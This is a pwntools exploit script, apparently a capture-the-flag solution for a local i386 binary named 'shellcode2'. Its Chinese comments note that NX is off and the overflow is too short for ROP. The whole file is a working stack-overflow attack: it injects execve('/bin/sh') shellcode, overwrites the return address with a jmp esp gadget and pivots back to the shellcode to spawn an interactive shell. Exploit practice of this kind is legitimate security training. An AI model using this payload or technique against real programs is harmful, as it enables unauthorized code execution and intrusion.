from pwn import *
context(log_level='debug',os='linux',arch='i386')
pwnfile = './shellcode2'
io=process(pwnfile)

elf = ELF(pwnfile)

#有溢出 但不够写入rop链 因为nx没开 所以考虑写入shellcode


def debug():
	gdb.attach(io)
	pause()

# shellcode
#debug()

jmp_esp = 0x08048504
shellcode = '''	
xor eax,eax
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
mov al,0xb
int 0x80
'''		#这个shellcode asm后长度为0x23		// syscall    execve('/bin/sh',0,0)
pay = asm(shellcode).ljust(0x24,b'\x00')+p32(jmp_esp)
#print("len_shellcode",len(asm(shellcode)))
pay += asm("sub esp,40;call esp")
io.sendline(pay)

io.interactive()
